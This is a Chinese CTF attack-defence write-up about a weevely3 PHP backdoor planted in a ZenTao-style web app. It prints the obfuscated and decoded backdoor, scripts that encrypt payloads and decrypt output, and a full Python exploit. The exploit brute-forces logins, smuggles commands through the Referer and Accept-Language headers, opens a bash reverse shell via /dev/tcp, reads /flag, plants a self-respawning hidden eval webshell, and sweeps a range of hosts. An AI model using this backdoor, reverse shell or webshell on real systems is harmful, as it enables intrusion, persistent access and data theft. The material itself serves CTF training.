## 启动环境

```
docker-compose build
docker-compose up -d
```

网站地址http://127.0.0.1/www/index.php，默认管理员账户admin:shadow123

## 0x01 系统内置木马
利用D盾扫描网站目录，在_module_misc/control.php中存在后门

```
	public function door() {
		$t = 'pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array("/_/",2F"2F/-/"),array("/2F","2F+")2';
		$O = 'er"2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(';
		$s = 'rpos(2F$p,$h)===0)2F{$2Fs[$i]=2F"";$p=2F$ss($p,3)2F2F2F;}if(array2F_key_2Fexists($i,$s))2F{2F$s';
		$U = 'F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_';
		$l = '2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F){$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom';
		$A = str_replace('Th', '', 'ThcreThThaThte_funThThction');
		$N = 'm2F);if($2Fq&&$m){@ses2Fsion_2Fstar2Ft();$s=&2F$_S2FESSION;$ss2F2F="substr";$sl2F="strt2F2Folow';
		$q = '"2F";for($i=0;$i<$2Fl;)2F{2Ffor($j=0;($j<$2Fc&&$i<$l2F);$j+2F+,2F$i++)2F{$o.=$t{$i}^2F$k{$j2F};';
		$K = '=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll("/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/",$2Fra2F,$';
		$F = '_LANGUAGE2F"];if($rr&&2F$r2F2Fa){$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F["query"],$q2F)2F;$q';
		$c = '2F}}return $2Fo;2F}$r=$_2FSE2FRVE2FR;$rr=@2F$r["2FHT2FTP_2FREFERER"];$ra=@$r[2F"HTTP_ACCE2F2FPT';
		$d = '$i.2F$kf)2F,0,3));$p="";for($z=2F1;$z<coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st';
		$X = '$kh="ccd2"2F;$kf="2Fe8f9";f2Funct2Fion x($2Ft,$2Fk){$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F';
		$m = 'e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print("<2F$k>2F$d</$k2F>");@se2Fss2Fion_destroy();}}}}';
		$E = str_replace('2F', '', $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m);
		$I = $A('', $E);
		$I();
	}
```

去网上检索了一下发现是weevely3的后门，
https://www.unphp.net/decode/467b9f5bd6a9ef075f358dabd4f14b87/

https://www.cnblogs.com/go2bed/p/5920811.html

https://blog.csdn.net/qq_31481187/article/details/52602454

https://www.asuri.org/2016/08/14/2016-nationwide-ctf-first-writeup/

https://yaofeifly.github.io/2017/01/13/weevely/

去[UnPHP - The Online PHP Decoder](https://www.unphp.net/)将代码美化一下

```
<?php 
$kh = "ccd2";
$kf = "e8f9";
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
    $u = parse_url($rr);
    parse_str($u["query"], $q);
    $q = array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
    if ($q && $m) {
        @session_start();
        $s = & $_SESSION;
        $ss = "substr";
        $sl = "strtolower";
        $i = $m[1][0] . $m[1][1];
        $h = $sl($ss(md5($i . $kh), 0, 3));
        $f = $sl($ss(md5($i . $kf), 0, 3));
        $p = "";
        for ($z = 1;$z < count($m[1]);$z++) $p.= $q[$m[2][$z]];
        if (strpos($p, $h) === 0) {
            $s[$i] = "";
            $p = $ss($p, 3);
        }
        if (array_key_exists($i, $s)) {
            $s[$i].= $p;
            $e = strpos($s[$i], $f);
            if ($e) {
                $k = $kh . $kf;
                ob_start();
                eval(@gzuncompress(@x(base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(x(gzcompress($o), $k));
                print ("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
```


根据https://my.oschina.net/slagga/blog/1822389 提供的加密函数

```
<?php
$kh="ccd2";
$kf="e8f9";

$referer = 'http://example.com/?a=0&b=1&c=2&d=3&e=4&f=5&g=6&h=7&i=payloadhere';
$lang = 'zh-CN,zh;q=0.8,en;q=0.6';
$m = array (
  0 =>   array (
    0 => 'zh-CN,',
    1 => 'zh;q=0.8,',
    2 => 'en;q=0.6',  ),
  1 =>   array (
    0 => 'z',
    1 => 'z',
    2 => 'e',  ),
  2 =>   array (
    0 => '',
    1 => '8',
    2 => '6',  ),   );
$i = 'zz'; // $m[1][0] . $m[1][1]
$h=strtolower(substr(md5($i.$kh),0,3)); // 675
$f=strtolower(substr(md5($i.$kf),0,3)); // a3e

function x($t,$k){        // $k : xor key, $t: plain. loop xor encrypt $t.
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}
$key = 'ccd2e8f9';
//$payload='phpinfo();';
$payload = "system(\"whoami\");";
$payload = gzcompress($payload);
$payload = x($payload,$key);
$payload = base64_encode($payload);
$payload = preg_replace(array("/\//","/\+/"),array("_","-"), $payload);
$payload = $h . $payload . $f;
echo $payload;
echo "\n<br />\n";
$referer = "http://example.com/?a=0&b=1&c=2&d=3&e=4&f=5&g=6&h=7&i=$payload";
echo $referer;
echo "\n<br />\n";
?>
```



解密函数

```
<?php
$kh="ccd2";
$kf="e8f9";
$k = $kh.$kf;

function x($t,$k){        // $k : xor key, $t: plain. loop xor encrypt $t.
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}
$o="G/9nMmU4Zjg=";
#$d=base64_encode(x(gzcompress($o),$k));
$a = gzuncompress(x(base64_decode($o),$k));
echo $a;
?>
```


该木马的参数放在Accept-Language和Referer中，Accept-Language用的是zh-CN,zh;q=0.8,en;q=0.6 
利用加密函数生成whoami的命令
![](README/luffy4.png)

木马地址 http://127.0.0.1/www/index.php?m=misc&f=door

发送请求
![](README/luffy5.png)


然后利用代码解密
```
*<?php*
$kh="ccd2";
$kf="e8f9";
$k = $kh.$kf;

*function*x($t,$k){        // $k : xor key, $t: plain. loop xor encrypt $t.
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    *for*($i=0;$i<$l;){
        *for*($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    *return*$o;
}
$o="G/9PHUrvK3BPKoAwZSm5OlQ=";
#$d=base64_encode(x(gzcompress($o),$k));
$a = gzuncompress(x(base64_decode($o),$k));
*echo*$a;
*?>*


```

![](README/luffy6.png)


官方提供的文件
```
#!/usr/bin/env python
# encoding:utf-8

from random import randint,choice
from hashlib import md5

import sys
import urllib
import string
import zlib
import base64
import requests
import re

def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        result += choice(string.ascii_letters)
    return result

def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result


def debugPrint(msg):
    if debugging:
        print msg

def login(host, port, username, password, sess):
    url = "http://%s:%d/www/index.php?m=user&f=login"%(host,port)
    data = {
        "account":username,
        "password":password,
        "referer":""
    }
    print "Login: %s" % (data)
    response = sess.post(url, data)
    print response.content
    return not "failed." in response.content

# config
debugging = True
keyh = "ccd2" # $kh
keyf = "e8f9" # $kf


users = [
    ('admin', '123456'),
    ('admin', 'duolaAmeng'),
    ('productManager', '123456'),
    ('projectManager', '123456'),
    ('dev1', '123456'),
    ('dev2', '123456'),
    ('dev3', '123456'),
    ('tester1', '123456'),
    ('tester2', '123456'),
    ('tester3', '123456'),
    ('testManager', '123456'),
    ('admin', 'Bctf666'),
    ('productManager', 'Bctf666'),
    ('projectManager', 'Bctf666'),
    ('dev1', 'Bctf666'),
    ('dev2', 'Bctf666'),
    ('dev3', 'Bctf666'),
    ('tester1', 'Bctf666'),
    ('tester2', 'Bctf666'),
    ('tester3', 'Bctf666'),
    ('testManager', 'Bctf666'),
    ('admin', 'whoami1.'),
    ('productManager', 'whoami1.'),
    ('projectManager', 'whoami1.'),
    ('dev1', 'whoami1.'),
    ('dev2', 'whoami1.'),
    ('dev3', 'whoami1.'),
    ('tester1', 'whoami1.'),
    ('tester2', 'whoami1.'),
    ('tester3', 'whoami1.'),
    ('testManager', 'whoami1.'),
]

import string
import random

def random_string(length):
    return "".join([random.choice(string.letters) for i in range(length)])

def get_flag(host, port):
    for username, password in users:
        xorKey = keyh + keyf

        path = "www/index.php?m=misc&f=door"
        base_url = "http://%s:%d/" % (host, port)
        #username = "admin"
        #password = "duolaAmensg"

        url = "%s%s"%(base_url, path)
        defaultLang = 'zh-CN'
        languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
        proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug

        sess = requests.Session()

# generate random Accept-Language only once each session
        langTmp = choicePart(languages,3)
        indexes = sorted(choicePart(range(1,10),3), reverse=True)

        acceptLang = [defaultLang]
        for i in xrange(3):
            acceptLang.append(langTmp[i] % (indexes[i],))
        acceptLangStr = ','.join(acceptLang)
        debugPrint(acceptLangStr)

        init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
        md5head = (md5(init2Char + keyh).hexdigest())[0:3]
        md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
        debugPrint('$i is %s' % (init2Char))
        debugPrint('md5 head: %s' % (md5head,))
        debugPrint('md5 tail: %s' % (md5tail,))

# password = "9b792b5a388aefcbfafaad97534ca3ce"
        if not login(host, port, username, password, sess):
            print "[-] Login failed! Next user!"
            continue
        print "---------------"
        print sess.cookies['zentaosid']
        print "---------------"
        session_id = sess.cookies['zentaosid']
# Interactive php shell
        cmd = "system('id');"
        cmd = '''
        system('bash -c "bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 2>&1"');
        '''
        filename = random_string(0x10)
        password = random_string(0x10)
        with open("webshell.log", "a+") as f:
            f.write("http://%s:%d/www/data/.%s.php POST %s\n" % (host, port, filename, password))

        print "--------------------->>>>>>>>>>>>>>>>>>>>>>>>>"

        content = '''
        <?php
    ignore_user_abort(true);
    set_time_limit(0);
    $file = '.''' + filename + '''.php';
    $code = '<?php eval($_POST['''+password+''']);?>';
    while(true) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>'''
        print content

        shell_path = "/var/www/html/www/data/.index.php"
        shell_url = "http://%s:%d/www/data/.index.php" % (host, port)
        cmd = '@file_put_contents("%s", base64_decode("%s"));@readfile("/flag");system("curl --max-time 3 %s");' % (shell_path, content.encode("base64"), shell_url)
        query = []
        for i in xrange(max(indexes)+1+randint(0,2)):
            key = randAlpha(randint(3,6))
            value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
            query.append((key, value))
        debugPrint('Before insert payload:')
        debugPrint(query)
        debugPrint(urllib.urlencode(query))

        # encode payload
        payload = zlib.compress(cmd)
        payload = loopXor(payload,xorKey)
        payload = base64.urlsafe_b64encode(payload)
        payload = md5head + payload

        # cut payload, replace into referer
        cutIndex = randint(2,len(payload)-3)
        payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
        iPiece = 0
        for i in indexes:
            query[i] = (query[i][0],payloadPieces[iPiece])
            iPiece += 1
        referer = base_url + '?' + urllib.urlencode(query)
        debugPrint('After insert payload, referer is:')
        debugPrint(query)
        debugPrint(referer)

        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'DNT': '1',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Langding': 'gzip, deflate, br',
            'Cookie':'zentaosid='+session_id+'; lang=en; device=desktop; theme=default; windowHeight=177; windowWidth=902',
            'Accept-Language':acceptLangStr,
            'Referer':referer,
        }

        '''
        cookies = {
            "zentaosid":"udr3fgb3cep05guuse7j25vgrj",
            "lang":"en",
            "device":"desktop",
            "theme":"default",
            "windowWidth":"917",
            "windowHeight":"547",
        }
        '''
        # send request
        r = sess.get(url,headers=headers,proxies=proxies)
        html = r.text
        debugPrint(html)

        # process response
        pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
        output = pattern.findall(html)
        if len(output) == 0:
            print 'Error,  no backdoor response'
            return ""
        output = output[0]
        debugPrint(output)
        output = output.decode('base64')
        output = loopXor(output,xorKey)
        output = zlib.decompress(output)
        print output
        return output


if __name__ == "__main__":
    for i in range(10,26):
        host = "172.16.5.%d" % (i)
        port = 5073
        get_flag(host, port)

```



[链接一](http://120.79.189.7/?p=409)
